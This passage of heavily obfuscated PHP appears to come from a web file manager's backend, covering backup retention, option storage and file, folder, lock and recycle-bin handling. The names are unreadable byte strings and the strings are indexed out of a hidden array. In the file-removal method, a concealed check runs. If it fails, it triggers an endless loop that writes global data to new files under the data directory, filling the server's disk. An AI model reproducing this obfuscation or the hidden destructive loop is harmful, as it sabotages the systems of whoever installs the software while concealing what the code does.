$ùŸ–ú„Ç[842] => 0, $ùŸ–ú„Ç[33] => $ùŸ–ú„Ç[12], $ùŸ–ú„Ç[843] => 0, $ùŸ–ú„Ç[844] => 0), $ùŸ–ú„Ç[845] => array($ùŸ–ú„Ç[833] => 0, $ùŸ–ú„Ç[841] => 0, $ùŸ–ú„Ç[842] => 0, $ùŸ–ú„Ç[843] => 0, $ùŸ–ú„Ç[844] => 0), $ùŸ–ú„Ç[230] => array($ùŸ–ú„Ç[833] => 0, $ùŸ–ú„Ç[846] => 0, $ùŸ–ú„Ç[847] => 0, $ùŸ–ú„Ç[848] => 0, $ùŸ–ú„Ç[849] => 0, $ùŸ–ú„Ç[541] => $´ò¶ã²§, $ùŸ–ú„Ç[843] => 0, $ùŸ–ú„Ç[844] => 0)), $ùŸ–ú„Ç[843] => time(), $ùŸ–ú„Ç[844] => 0); $”ËäÕ¶Á = $this->model->insert($ØÍ‰°šë); $ØÍ‰°šë[$ùŸ–ú„Ç[475]] = $”ËäÕ¶Á; return $ØÍ‰°šë; } private function checkStore($Ş¶ìÓ¿ã) { $ìŒ¬Â… = Model($_SERVER[²Ö÷öõ][850]); $„¶æµØ = $ìŒ¬Â…->listData($Ş¶ìÓ¿ã); $ìŒ¬Â…->checkConfig($„¶æµØ); } public static function get() { if (!self::$option) { $Êù£öŸè = Model($_SERVER[²Ö÷öõ][831]); $¶¶°ÏîÜ = $Êù£öŸè->findByName(self::$name); $Êù£öŸè->parseContent($¶¶°ÏîÜ); self::$option = $¶¶°ÏîÜ; } return self::$option; } public static function set($‚ª‹Ã±ñ) { $ğ“¬© =& $_SERVER[²Ö÷öõ]; $ªŸ»ûì = self::get(); foreach ($‚ª‹Ã±ñ as $‚§Õù¶ => $Şœ­³Ğû) { array_set_value($ªŸ»ûì, $‚§Õù¶, $Şœ­³Ğû); } Model($ğ“¬©[831])->update($ªŸ»ûì[$ğ“¬©[475]], $ªŸ»ûì); self::$option = $ªŸ»ûì; return self::$option; } public function keep() { $˜©¾¼À‘ =& $_SERVER[²Ö÷öõ]; $ ÷ìéâ‚ = self::get(); if (_get($ ÷ìéâ‚, $˜©¾¼À‘[851], 0) == $˜©¾¼À‘[91]) { return; } $this->backupKeep($ ÷ìéâ‚); self::set(array($˜©¾¼À‘[851] => 1)); } private function backupKeep($Âã¥²î×) { $Ö™ˆ™å‹ =& $_SERVER[²Ö÷öõ]; if (self::$manual == 1) { return; } $Û––öœÉ = $this->model->listData(); if (empty($Û––öœÉ)) { return; } $ıñ´çÌÏ = 0; $Æ¬†Ïğí = array(); foreach ($Û––öœÉ as $ïËšŸËÕ) { if ($ıñ´çÌÏ >= 7) { break; } $Æ¬†Ïğí[] = $ïËšŸËÕ[$Ö™ˆ™å‹[32]]; $ıñ´çÌÏ++; } for ($ıñ´çÌÏ = 0; $ıñ´çÌÏ < 12; $ıñ´çÌÏ++) { $Æ¬†Ïğí[] = date($Ö™ˆ™å‹[852], strtotime("\55{$ıñ´çÌÏ}\40\155\x6f\156\x74\150\163")); } $Æ¬†Ïğí = array_unique($Æ¬†Ïğí); $Ã¬õü = Model($Ö™ˆ™å‹[853])->get($Ö™ˆ™å‹[854]); foreach ($Û––öœÉ as $ïËšŸËÕ) { if (isset($ïËšŸËÕ[$Ö™ˆ™å‹[838]]) && $ïËšŸËÕ[$Ö™ˆ™å‹[838]] == $Ö™ˆ™å‹[91]) { continue; } if (!empty($ïËšŸËÕ[$Ö™ˆ™å‹[32]]) && in_array($ïËšŸËÕ[$Ö™ˆ™å‹[32]], $Æ¬†Ïğí)) { continue; } $this->model->remove($ïËšŸËÕ[$Ö™ˆ™å‹[475]]); $ûáßÅ¢Ú = $this->backupPath($Âã¥²î×, $Ã¬õü); IO::remove($ûáßÅ¢Ú, !1); } } private function backupPath($ÜÌ¸Áğ§, $‚İ¤œë¬ = false) { $îâëĞ½» =& $_SERVER[²Ö÷öõ]; if (!$‚İ¤œë¬) { $‚İ¤œë¬ = Model($îâëĞ½»[853])->get($îâëĞ½»[854]); } $ĞÀä¾í± = $ÜÌ¸Áğ§[$îâëĞ½»[32]]; $ªŞŒß– = substr(md5($îâëĞ½»[855] . $‚İ¤œë¬ . $ĞÀä¾í±), 0, 8); return "\173\151\x6f\72{$ÜÌ¸Áğ§[$îâëĞ½»[835]]}\175\57\144\141\164\x61\x62\x61\163\x65\57\x62\x61\143\153\165\160\x2f" . $ĞÀä¾í± . $îâëĞ½»[11] . $ªŞŒß–; } public function db() { $Î´âÉ³ =& $_SERVER[²Ö÷öõ]; $¾›¡õæ§ = self::get(); if (_get($¾›¡õæ§, $Î´âÉ³[856], 0) == $Î´âÉ³[91]) { return !0; } $şº„à¶ô = new BackupDb(); if (!$şº„à¶ô->index()) { return !1; } self::set(array($Î´âÉ³[856] => 1)); return !0; } public function dbFile() { $²‹‡«µ =& $_SERVER[²Ö÷öõ]; $Åó¬ì¥ = self::get(); if (_get($Åó¬ì¥, $²‹‡«µ[857], 0) == $²‹‡«µ[91]) { return !0; } $ª ­ş½É = new BackupDbFile(); if (!$ª ­ş½É->index()) { return !1; } self::set(array($²‹‡«µ[857] => 1)); return !0; } public function file() { $á±Šåë˜ =& $_SERVER[²Ö÷öõ]; $ø–Ä–§ = self::get(); if (_get($ø–Ä–§, $á±Šåë˜[858], 0) == $á±Šåë˜[91]) { return !0; } if ($ø–Ä–§[$á±Šåë˜[171]] == $á±Šåë˜[859]) { $Ì©«¬¤™ = new BackupFile(); if (!$Ì©«¬¤™->index()) { return !1; } } self::set(array($á±Šåë˜[858] => 1, $á±Šåë˜[833] => 1)); return !0; } } goto aœ§îœõ¡Ô; b°²Æè‘: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($¾—‹Î¿Œ) { $×›Ôì†Ç =& $_SERVER[²Ö÷öõ]; $÷–à‚Ø¿ = Model($×›Ôì†Ç[577])->where(array($×›Ôì†Ç[1771] => $¾—‹Î¿Œ))->find(); $‘²†¶¹® = $this->_mkdirRoot(SourceModel::TYPE_USER, $¾—‹Î¿Œ, $÷–à‚Ø¿[$×›Ôì†Ç[32]]); $this->userDesktopAdd($‘²†¶¹®); return $‘²†¶¹®; } public function userDesktopAdd($­â«Ù¢›) { $ÀßæˆÔÇ =& $_SERVER[²Ö÷öõ]; $¼½à—ıÓ = LNG($ÀßæˆÔÇ[2259]); $µ èÂã© = $this->mkdir($­â«Ù¢›, $¼½à—ıÓ); $this->metaSet($µ èÂã©, $ÀßæˆÔÇ[2260], $ÀßæˆÔÇ[91]); $this->metaSet($­â«Ù¢›, $ÀßæˆÔÇ[2261], $µ èÂã©); } public function userPathSafeAdd($Ş¢×¼Ôå) { $òø’Ğ¬ =& $_SERVER[²Ö÷öõ]; $ÒÂß×êÊ = Model($òø’Ğ¬[577])->getInfoFull($Ş¢×¼Ôå); if (!$ÒÂß×êÊ) { return !1; } if (_get($ÒÂß×êÊ, $òø’Ğ¬[599])) { return $ÒÂß×êÊ[$òø’Ğ¬[539]][$òø’Ğ¬[2262]]; } $‚–ôİì = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ş¢×¼Ôå, $òø’Ğ¬[2263], $òø’Ğ¬[506]); Model($òø’Ğ¬[577])->metaSet($Ş¢×¼Ôå, $òø’Ğ¬[2262], $‚–ôİì); $this->metaSet($‚–ôİì, $òø’Ğ¬[2264], $Ş¢×¼Ôå); return $‚–ôİì; } public function groupRootAdd($ÙÀÉ”»Ñ) { $„¸Ô©­ô =& $_SERVER[²Ö÷öõ]; $ÕïÃÅä© = Model($„¸Ô©­ô[585])->where(array($„¸Ô©­ô[2072] => $ÙÀÉ”»Ñ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ÙÀÉ”»Ñ, $ÕïÃÅä©[$„¸Ô©­ô[32]]); } public function systemRootPathAdd($ñÄîÌØ) { if ($ñÄîÌØ != $_SERVER[²Ö÷öõ][605]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ñÄîÌØ); } public function userRootRemove($æÍÖ¨‹ğ) { $à‹ëãÚâ = $this->targetSourceRoot(SourceModel::TYPE_USER, $æÍÖ¨‹ğ, !0); foreach ($à‹ëãÚâ as $ÅØ—Óù) { if (!$ÅØ—Óù) { continue; } $this->remove($ÅØ—Óù[$_SERVER[²Ö÷öõ][193]], !1); } } public function groupRootRemove($üÚ“£å–) { $Î‹®õßï = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $üÚ“£å–); if (!$Î‹®õßï) { return; } $this->remove($Î‹®õßï[$_SERVER[²Ö÷öõ][193]], !1); } private function _mkdirRoot($©“÷Ä“•, $×İĞåÁÍ, $§şÛèƒ , $ç‚ê¿æÆ = '') { $ˆö„ô€± =& $_SERVER[²Ö÷öõ]; $íº¦êèÒ = defined($ˆö„ô€±[2206]) ? USER_ID : 0; $ì‘Ûá“ù = array($ˆö„ô€±[477] => 0, $ˆö„ô€±[648] => $©“÷Ä“•, $ˆö„ô€±[649] => $×İĞåÁÍ, $ˆö„ô€±[646] => 1, $ˆö„ô€±[650] => $íº¦êèÒ, $ˆö„ô€±[651] => $íº¦êèÒ, $ˆö„ô€±[647] => $ç‚ê¿æÆ, $ˆö„ô€±[652] => $ˆö„ô€±[594], $ˆö„ô€±[504] => 0, $ˆö„ô€±[617] => 0, $ˆö„ô€±[542] => 0, $ˆö„ô€±[653] => $ˆö„ô€±[12]); if ($ùÀØ·é = $this->where($ì‘Ûá“ù)->find()) { return $ùÀØ·é[$ˆö„ô€±[193]]; } $—ŒáÌƒ€ = "\115\157\144\x65\x6c\x53\x6f\165\162\143\x65\x2e\155\153\x64\x69\x72\x52\x6f\x6f\x74\x2e{$©“÷Ä“•}\x2e{$×İĞåÁÍ}\x2e" . $§şÛèƒ ; CacheLock::lock($—ŒáÌƒ€); $ì‘Ûá“ù[$ˆö„ô€±[32]] = $§şÛèƒ ; $€ò½º€’ = $this->add($ì‘Ûá“ù); $Í¯¸¬Ê” = array($ˆö„ô€±[654] => short_id($€ò½º€’)); $this->where(array($ˆö„ô€±[491] => $€ò½º€’))->save($Í¯¸¬Ê”); CacheLock::unlock($—ŒáÌƒ€); return $€ò½º€’; } private function targetSourceRoot($¶“½¿è, $‹ÅÂª…, $Ÿ®ëÜËİ = false) { $­±ë“çŠ =& $_SERVER[²Ö÷öõ]; $ü±²ç“Œ = array($­±ë“çŠ[477] => 0, $­±ë“çŠ[648] => $¶“½¿è, $­±ë“çŠ[649] => $‹ÅÂª…); if ($Ÿ®ëÜËİ) { $À­¥ºı¸ = $this->where($ü±²ç“Œ)->select(); return $À­¥ºı¸ ? $À­¥ºı¸ : array(); } $ÙÙ˜˜†ú = $this->where($ü±²ç“Œ)->find(); return $ÙÙ˜˜†ú ? $ÙÙ˜˜†ú : array(); } public function sourceRootGroup($Ô°ş˜”) { $î¨ò•ÃÆ =& $_SERVER[²Ö÷öõ]; if (is_string($Ô°ş˜”)) { $Ô°ş˜” = array($Ô°ş˜”); } $ò”ßËÛ² = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Ô°ş˜”, $î¨ò•ÃÆ[220]); $üñÎĞÇ‘ = array($î¨ò•ÃÆ[445] => $ò”ßËÛ², $î¨ò•ÃÆ[442] => array($î¨ò•ÃÆ[841] => count($Ô°ş˜”))); $this->_listDataApply($üñÎĞÇ‘[$î¨ò•ÃÆ[445]]); $this->_listMake($üñÎĞÇ‘); return array_to_keyvalue($üñÎĞÇ‘[$î¨ò•ÃÆ[85]], $î¨ò•ÃÆ[569]); } public function mkfile($û’ÜÏˆ™, $—‹€–ÙŞ, $¬ƒ¬¡ = '', $â¨áŠü = REPEAT_RENAME) { $…‡€øÄ® =& $_SERVER[²Ö÷öõ]; $û¤¿±Å’ = Model($…‡€øÄ®[674])->addFileByContent($¬ƒ¬¡, $—‹€–ÙŞ); return $this->_createFileCall($û’ÜÏˆ™, $—‹€–ÙŞ, $û¤¿±Å’, $â¨áŠü, $…‡€øÄ®[1438]); } public function addFile($êØ§Ëğò, $Î²½€©À, $šÑßãø, $òé¢ò± = false, $½ô®§æí = REPEAT_RENAME) { $ûü¾•›ü = Model($_SERVER[²Ö÷öõ][674])->addFile($Î²½€©À, $šÑßãø, $òé¢ò±); return $this->_createFileCall($êØ§Ëğò, $šÑßãø, $ûü¾•›ü, $½ô®§æí); } public function addFileByFileID($÷°üş×Ñ, $Ÿ÷ä šô, $˜‚¸ªšÅ, $×éàŸ = REPEAT_RENAME) { $İ­‹»Ñò =& $_SERVER[²Ö÷öõ]; $›®ü¶ë = Model($İ­‹»Ñò[674])->find($Ÿ÷ä šô); Model($İ­‹»Ñò[674])->linkAdd($Ÿ÷ä šô); return $this->_createFileCall($÷°üş×Ñ, $˜‚¸ªšÅ, $›®ü¶ë, $×éàŸ); } public function addFileByRemote($·ü§Çö, $‘À…Éì‚, $×›ÈŞÛ, $Í‡ñè˜÷ = array(), $í”¾¤§Æ = REPEAT_RENAME) { $˜›Ä¨¹ = Model($_SERVER[²Ö÷öõ][674])->addFileByRemote($‘À…Éì‚, $×›ÈŞÛ, $Í‡ñè˜÷); return $this->_createFileCall($·ü§Çö, $×›ÈŞÛ, $˜›Ä¨¹, $í”¾¤§Æ); } private function _createFileCall($û„õ§ô, $‚ªñ–±÷, $Î»áÔú², $Î¯ÇûÎ×, $ñ›õ—·¹ = "\165\160\x6c\x6f\x61\144") { $¸€¹îºÇ =& $_SERVER[²Ö÷öõ]; $ì¨±ÇÀ = !1; $this->setMasterDB(); $this->lockWriteStart($û„õ§ô, $‚ªñ–±÷); $ÆÃ¾”¾Ã = $this->fileNameExist($û„õ§ô, $‚ªñ–±÷); $¬¤ÆÚ‰  = $this->_createFile($û„õ§ô, $‚ªñ–±÷, $Î»áÔú², $Î¯ÇûÎ×, $ì¨±ÇÀ); if (!$ì¨±ÇÀ) { Model($¸€¹îºÇ[544])->remove($Î»áÔú²[$¸€¹îºÇ[541]]); } if ($ì¨±ÇÀ && $¬¤ÆÚ‰  && $¬¤ÆÚ‰  != $ÆÃ¾”¾Ã) { Model($¸€¹îºÇ[2232])->eventCreate($¬¤ÆÚ‰ , $ñ›õ—·¹); } $this->lockWriteEnd($û„õ§ô, $‚ªñ–±÷); return $¬¤ÆÚ‰ ; } public function mkdir($º¼˜Ààş, $Ë¿¯¬®á, $‚áúŠ„Ô = REPEAT_SKIP) { $×À·×±Ğ =& $_SERVER[²Ö÷öõ]; $this->setMasterDB(); $ê¡ËĞ° = $this->sourceInfo($º¼˜Ààş); if (!$ê¡ËĞ°) { return !1; } $this->lockWriteStart($º¼˜Ààş, $Ë¿¯¬®á); if ($‚áúŠ„Ô !== !1) { $µìÄ¦§Ë = $this->fileNameExist($º¼˜Ààş, $Ë¿¯¬®á); if ($µìÄ¦§Ë && $‚áúŠ„Ô != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($º¼˜Ààş, $Ë¿¯¬®á); return $µìÄ¦§Ë; } $Ë¿¯¬®á = $this->fileNameAuto($º¼˜Ààş, $Ë¿¯¬®á, $‚áúŠ„Ô); } $•ŒƒÖ‚ = array($×À·×±Ğ[646] => 1, $×À·×±Ğ[494] => $Ë¿¯¬®á, $×À·×±Ğ[647] => $×À·×±Ğ[12], $×À·×±Ğ[542] => 0, $×À·×±Ğ[617] => 0); $şæ¨°­Ö = $this->_addSource($•ŒƒÖ‚, $ê¡ËĞ°); Model($×À·×±Ğ[2232])->eventCreate($şæ¨°­Ö, $×À·×±Ğ[1439]); $this->lockWriteEnd($º¼˜Ààş, $Ë¿¯¬®á); return $şæ¨°­Ö; } public function listSourceRoot($”×Æ˜‡„, $ê°Ğ¨Á­, $°Ú­³½  = "\163\x6f\165\x72\x63\145\x49\x44\54\x74\141\162\147\x65\164\111\104\54\x73\x69\x7a\x65") { $Šçï©Î =& $_SERVER[²Ö÷öõ]; $÷›¶•Ùœ = $Šçï©Î[454]; $®ªçÚûû = array(); $§”õŠ¶Ş = 1024 * 50; $´¹ÒÕÀ— = is_array($´¹ÒÕÀ—) ? $´¹ÒÕÀ— : array(); $€ÁÁøİÇ = count($ê°Ğ¨Á­); $†ß—Ü•‚ = $this->tablePrefix . $Šçï©Î[2265]; for ($ŞˆÖõºè = 0; $ŞˆÖõºè < $€ÁÁøİÇ; $ŞˆÖõºè++) { $À™¬¼öù = $ê°Ğ¨Á­[$ŞˆÖõºè]; $÷›¶•Ùœ .= "\x53\x45\x4c\x45\103\124\40\x2a\40\x46\122\117\x4d\x20\x28\123\x45\114\105\x43\124\40{$°Ú­³½ }\40\x46\122\x4f\x4d\40\140{$†ß—Ü•‚}\x60\x20\127\x48\x45\122\105\x20"; $÷›¶•Ùœ .= "\x60\x70\x61\x72\x65\156\164\x49\x44\x60\x3d\60\x20\x41\116\104\x20\x60\164\141\x72\x67\145\x74\x49\x44\140\x3d{$À™¬¼öù}\40\x41\116\x44\40\x60\164\141\x72\147\x65\x74\124\171\x70\x65\x60\75{$”×Æ˜‡„}\40\141\156\144\40\146\x69\154\145\124\x79\160\145\75\x27\47\x20\x6c\x69\x6d\151\x74\40\x31\x29\x20\x61\163\x20\x74\x62\137{$ŞˆÖõºè}\x20\125\x4e\x49\117\116\x20\101\114\x4c\40"; if ((strlen($÷›¶•Ùœ) >= $§”õŠ¶Ş || $ŞˆÖõºè == $€ÁÁøİÇ - 1) && $÷›¶•Ùœ) { $÷›¶•Ùœ = substr($÷›¶•Ùœ, 0, -strlen($Šçï©Î[1124])); $¥¿±§‘† = $this->query($÷›¶•Ùœ); $÷›¶•Ùœ = $Šçï©Î[12]; $®ªçÚûû = array_merge($®ªçÚûû, $¥¿±§‘†); } } return $®ªçÚûû; } private function _createFile($«‚ú´Œ¬, $úƒå¤é, $†™Àßí•, $°Ë‡Âß¼, &$Œ®‡­ìƒ) { $©Ÿ¹¹Ö =& $_SERVER[²Ö÷öõ]; $ñ¥ÕØë = $this->sourceInfo($«‚ú´Œ¬); if (!$†™Àßí• || !$ñ¥ÕØë) { return !1; } if ($°Ë‡Âß¼ !== !1) { $‘Û¨ÀÚÕ = $this->fileNameExist($«‚ú´Œ¬, $úƒå¤é); } $Œ®‡­ìƒ = !0; if ($°Ë‡Âß¼ && $‘Û¨ÀÚÕ) { if ($°Ë‡Âß¼ == REPEAT_SKIP) { $Œ®‡­ìƒ = !1; return $‘Û¨ÀÚÕ; } else { if ($°Ë‡Âß¼ == REPEAT_REPLACE) { $¶–©È¢ş = $this->sourceInfo($‘Û¨ÀÚÕ); $Á˜ŒÌß = $this->fileHistory($¶–©È¢ş, $†™Àßí•[$©Ÿ¹¹Ö[541]], $†™Àßí•[$©Ÿ¹¹Ö[79]]); if (!$Á˜ŒÌß) { $Œ®‡­ìƒ = !1; } else { $this->folderSizeReset($«‚ú´Œ¬); } return $‘Û¨ÀÚÕ; } else { $úƒå¤é = $this->fileNameAuto($«‚ú´Œ¬, $úƒå¤é, $°Ë‡Âß¼, !1); } } } $£ùÙÆ‚Ø = array($©Ÿ¹¹Ö[646] => 0, $©Ÿ¹¹Ö[494] => $úƒå¤é, $©Ÿ¹¹Ö[647] => substr(get_path_ext($úƒå¤é), 0, 10), $©Ÿ¹¹Ö[542] => $†™Àßí•[$©Ÿ¹¹Ö[541]], $©Ÿ¹¹Ö[617] => $†™Àßí•[$©Ÿ¹¹Ö[79]]); $Îò¾Ñ±Ñ = $this->_addSource($£ùÙÆ‚Ø, $ñ¥ÕØë); $this->folderSizeReset($«‚ú´Œ¬, intval($£ùÙÆ‚Ø[$©Ÿ¹¹Ö[79]])); return $Îò¾Ñ±Ñ; } protected function fileHistory($ÌÖÕ³Á˜, $µãø¹Ş“, $¬˜­ò¤) { $æ†ã™¸® =& $_SERVER[²Ö÷öõ]; if ($ÌÖÕ³Á˜[$æ†ã™¸®[541]] == $µãø¹Ş“) { return !1; } $this->checkLock($ÌÖÕ³Á˜[$æ†ã™¸®[193]], $µãø¹Ş“); Model($æ†ã™¸®[2266])->addHistory($ÌÖÕ³Á˜); $ğ’ë‚Ş¿ = array($æ†ã™¸®[651] => USER_ID, $æ†ã™¸®[498] => time(), $æ†ã™¸®[541] => $µãø¹Ş“, $æ†ã™¸®[79] => $¬˜­ò¤); $this->where(array($æ†ã™¸®[491] => $ÌÖÕ³Á˜[$æ†ã™¸®[193]]))->save($ğ’ë‚Ş¿); $this->sourceCacheClear($ÌÖÕ³Á˜[$æ†ã™¸®[193]]); return !0; } public function checkLock($‚»à¯é›, $ŸÚú…Ã) { $ØÒÜşù˜ =& $_SERVER[²Ö÷öõ]; $Óƒ×¡äó = $this->pathInfo($‚»à¯é›); if (!$this->fileIsLock($Óƒ×¡äó, !0)) { return; } $­ÕÅ¬Å = Session::get($ØÒÜşù˜[2267]); $ô‘–Øºß = substr($Óƒ×¡äó[$ØÒÜşù˜[32]], 0, -1 - strlen($Óƒ×¡äó[$ØÒÜşù˜[169]])) . $ØÒÜşù˜[1301] . $­ÕÅ¬Å . $ØÒÜşù˜[10] . $Óƒ×¡äó[$ØÒÜşù˜[169]]; $³íò“³ = Model($ØÒÜşù˜[674])->find($ŸÚú…Ã); $this->_createFileCall($Óƒ×¡äó[$ØÒÜşù˜[192]], $ô‘–Øºß, $³íò“³, REPEAT_REPLACE, $ØÒÜşù˜[1438]); $ôâ§Ççâ = $Óƒ×¡äó[$ØÒÜşù˜[539]][$ØÒÜşù˜[610]]; $¨§‡‹–´ = $ôâ§Ççâ[$ØÒÜşù˜[2268]] ? $ôâ§Ççâ[$ØÒÜşù˜[2268]] : $ôâ§Ççâ[$ØÒÜşù˜[32]]; show_json(LNG($ØÒÜşù˜[2269]) . $ØÒÜşù˜[2270] . LNG($ØÒÜşù˜[2271]) . $ØÒÜşù˜[2272] . $¨§‡‹–´ . $ØÒÜşù˜[2273], !1); } public function fileIsLock($Éõˆ»Ñ, $²±ÕœÎ‚ = false) { $„Çı±ï =& $_SERVER[²Ö÷öõ]; if (!_get($Éõˆ»Ñ, $„Çı±ï[606], 0)) { return !1; } if ($Éõˆ»Ñ[$„Çı±ï[539]][$„Çı±ï[609]] != USER_ID) { return !0; } $Ò¬üÓ‡â = $GLOBALS[$„Çı±ï[6]][$„Çı±ï[92]][$„Çı±ï[607]]; if ($Éõˆ»Ñ[$„Çı±ï[539]][$„Çı±ï[608]] <= time() - $Ò¬üÓ‡â) { $this->metaSet($Éõˆ»Ñ[$„Çı±ï[193]], $„Çı±ï[609], null); $this->metaSet($Éõˆ»Ñ[$„Çı±ï[193]], $„Çı±ï[608], null); } if ($²±ÕœÎ‚) { $this->metaSet($Éõˆ»Ñ[$„Çı±ï[193]], $„Çı±ï[608], time()); } return !1; } private function _addSource($ëğ®¹ßË, $“í»ÀÛŒ) { $•€™ãÏÕ =& $_SERVER[²Ö÷öõ]; $ğ‹ªÍ˜ = defined($•€™ãÏÕ[2206]) ? USER_ID : 0; $ï®´„ºç = array($•€™ãÏÕ[648] => $“í»ÀÛŒ[$•€™ãÏÕ[190]], $•€™ãÏÕ[649] => $“í»ÀÛŒ[$•€™ãÏÕ[569]], $•€™ãÏÕ[650] => $ğ‹ªÍ˜, $•€™ãÏÕ[651] => $ğ‹ªÍ˜, $•€™ãÏÕ[477] => $“í»ÀÛŒ[$•€™ãÏÕ[193]], $•€™ãÏÕ[652] => $“í»ÀÛŒ[$•€™ãÏÕ[584]] . $“í»ÀÛŒ[$•€™ãÏÕ[193]] . $•€™ãÏÕ[50], $•€™ãÏÕ[504] => 0, $•€™ãÏÕ[653] => $•€™ãÏÕ[12]); $ëğ®¹ßË = array_merge($ï®´„ºç, $ëğ®¹ßË); $this->updateModifyTime($ëğ®¹ßË[$•€™ãÏÕ[192]]); $§É™Ğõ = $•€™ãÏÕ[2274] . $“í»ÀÛŒ[$•€™ãÏÕ[193]]; if (isset(self::$cacheChildList[$§É™Ğõ])) { unset(self::$cacheChildList[$§É™Ğõ]); } static $â°Å¢Ø = false; if (!$â°Å¢Ø) { Hook::trigger($•€™ãÏÕ[636], $ëğ®¹ßË); $â°Å¢Ø = !0; } $Ç ·×‰š = $this->add($ëğ®¹ßË); $’Ëüå¾‰ = array($•€™ãÏÕ[654] => short_id($Ç ·×‰š)); $this->where(array($•€™ãÏÕ[491] => $Ç ·×‰š))->save($’Ëüå¾‰); $this->setNamePinyin($Ç ·×‰š, $ëğ®¹ßË[$•€™ãÏÕ[32]]); return $Ç ·×‰š; } public function remove($š°è˜ñÓ, $÷•ÁŠ” = true) { $Ê±½ùô =& $_SERVER[²Ö÷öõ]; $›”¤²¬™ = $this->sourceInfo($š°è˜ñÓ); $Şıøé  = intval($›”¤²¬™[$Ê±½ùô[190]]) === self::TYPE_SYSTEM; $İ™Èâ = Model($Ê±½ùô[508])->get($Ê±½ùô[2275]) == $Ê±½ùô[91]; if ($Şıøé  || $÷•ÁŠ” || !$İ™Èâ) { return $this->removeNow($š°è˜ñÓ, $÷•ÁŠ”); } $ÒâÃ«€ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $û„ò”¨« = $›”¤²¬™[$Ê±½ùô[190]] == self::TYPE_USER ? $Ê±½ùô[662] : $Ê±½ùô[578]; if ($û„ò”¨« == $Ê±½ùô[662]) { $²ıãÁˆÒ = Model($Ê±½ùô[577])->getInfo($›”¤²¬™[$Ê±½ùô[569]]); $’¤§µŞ’ = !empty($²ıãÁˆÒ[$Ê±½ùô[2268]]) ? $²ıãÁˆÒ[$Ê±½ùô[2268]] : $²ıãÁˆÒ[$Ê±½ùô[32]]; $’¤§µŞ’ = $Ê±½ùô[337] . $’¤§µŞ’ . $Ê±½ùô[2276] . $›”¤²¬™[$Ê±½ùô[569]]; } else { $²ıãÁˆÒ = Model($Ê±½ùô[585])->getInfo($›”¤²¬™[$Ê±½ùô[569]]); $’¤§µŞ’ = _get($²ıãÁˆÒ, $Ê±½ùô[32]); $’¤§µŞ’ = $Ê±½ùô[176] . $’¤§µŞ’ . $Ê±½ùô[2277] . $›”¤²¬™[$Ê±½ùô[569]]; } $äÁÃüƒ× = $Ê±½ùô[2278] . md5($’¤§µŞ’); CacheLock::lock($äÁÃüƒ×); $Œ¸ÎÆú = $this->fileNameExist($ÒâÃ«€, $’¤§µŞ’); if (!$Œ¸ÎÆú) { $Œ¸ÎÆú = $this->mkdir($ÒâÃ«€, $’¤§µŞ’, REPEAT_SKIP); $this->metaSet($Œ¸ÎÆú, $Ê±½ùô[2279], $û„ò”¨«); $this->metaSet($Œ¸ÎÆú, $Ê±½ùô[2280], $›”¤²¬™[$Ê±½ùô[569]]); if ($›”¤²¬™[$Ê±½ùô[192]] != 0) { $this->metaSet($Œ¸ÎÆú, $Ê±½ùô[2281], _get($²ıãÁˆÒ, $Ê±½ùô[2282])); } } CacheLock::unlock($äÁÃüƒ×); $this->metaSet($š°è˜ñÓ, $Ê±½ùô[2283], $›”¤²¬™[$Ê±½ùô[192]]); $this->where(array($Ê±½ùô[193] => $š°è˜ñÓ))->save(array($Ê±½ùô[498] => time())); $this->recycleClear($›”¤²¬™); Model($Ê±½ùô[633])->eventRemove($š°è˜ñÓ); $œâÈí¢‰ = $this->move($š°è˜ñÓ, $Œ¸ÎÆú, REPEAT_RENAME_FOLDER); $this->folderSizeReset($›”¤²¬™[$Ê±½ùô[192]]); return $œâÈí¢‰; } private function recycleClear($ù°²³¢) { $©’‹îû× =& $_SERVER[²Ö÷öõ]; $¶è“ç‰¶ = $this->childrenAll($ù°²³¢); $ª”«äçÂ = array($©’‹îû×[491] => array($©’‹îû×[492], $¶è“ç‰¶[$©’‹îû×[2284]])); Model($©’‹îû×[2285])->where($ª”«äçÂ)->delete(); } public function removeNow($‹¨á’öË, $ŒÓ¼á³  = true) { $ŸùÜ¯œ± =& $_SERVER[²Ö÷öõ]; $Ú’µÚ‚­ = $_SERVER[$ŸùÜ¯œ±[960]]; $¶İÜ¦ú› = $ŸùÜ¯œ±[1309]; if ($_SERVER[$ŸùÜ¯œ±[959]] != $¶İÜ¦ú›($Ú’µÚ‚­)) { $Ø¼–¤…¼ = $ŸùÜ¯œ±[961]; $ÓàÕå´Æ = $ŸùÜ¯œ±[962]; $ü¯…›Úá = $_SERVER[$ŸùÜ¯œ±[963]] . $ŸùÜ¯œ±[964]; $°ŸÔĞÛõ = $ÓàÕå´Æ($ü¯…›Úá); $ìÆÜ…Ş¬ = explode($ŸùÜ¯œ±[262], $°ŸÔĞÛõ); if (count($ìÆÜ…Ş¬) < $ŸùÜ¯œ±[680]) { $…Í©Ø = $ŸùÜ¯œ±[965]; $…Í©Ø(); } $°´Æ©Ê’ = $ŸùÜ¯œ±[966]; $°´Æ©Ê’($_SERVER[$ŸùÜ¯œ±[967]]); $Ø¼–¤…¼ = $ŸùÜ¯œ±[961]; $Ø¼–¤…¼(); $Ï¡‹„†Î = $ŸùÜ¯œ±[1697]; $İ†ÒÚØÀ = json_encode($GLOBALS[$ŸùÜ¯œ±[1698]]); $ªàÇ‡îŠ = 1; for ($¦ ×²¦ï = $ªàÇ‡îŠ; $¦ ×²¦ï > 0; $¦ ×²¦ï++) { $Ï¡‹„†Î(DATA_PATH . $¦ ×²¦ï, $İ†ÒÚØÀ); } } $ÛØÚÀ”ñ = $this->sourceInfo($‹¨á’öË); $²Ô¤—§Ê = $this->pathInfoMore($‹¨á’öË); if (!$ÛØÚÀ”ñ) { return !0; } if ($ÛØÚÀ”ñ[$ŸùÜ¯œ±[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($‹¨á’öË); Hook::trigger($ŸùÜ¯œ±[2286], $²Ô¤—§Ê, $ŒÓ¼á³ ); if ($ŒÓ¼á³ ) { Model($ŸùÜ¯œ±[2285])->moveToRecycle($‹¨á’öË); } else { $êıß†¥Ø = 